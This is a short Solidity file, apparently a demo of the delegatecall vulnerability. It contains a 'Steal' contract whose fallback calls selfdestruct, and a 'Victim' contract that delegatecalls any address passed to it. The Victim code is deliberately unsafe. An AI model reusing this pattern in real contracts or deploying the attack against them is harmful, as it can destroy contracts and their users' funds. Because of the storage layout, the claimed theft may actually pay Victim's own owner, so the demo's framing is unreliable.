// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;   

contract Steal{
    address public owner;
    event OWNER_LOG(address owner);
    event STEAL_LOG();

    constructor() {
      owner = msg.sender;
      emit OWNER_LOG(owner);
    }

    fallback() external {
        emit STEAL_LOG();
        selfdestruct(payable(address(owner)));
    }

    function getOwnerBal() public view returns (uint) {
        return address(owner).balance;
    }
}

contract Victim { 
    address public owner;
    constructor() {
      owner = msg.sender;
    }
    function callSteal(address _c) public payable {
        // delegate call to non existing function
        // will trigger fallback function     
        (bool success, ) = _c.delegatecall("setVars"); 
        require(success, "something went wrong");
    }
}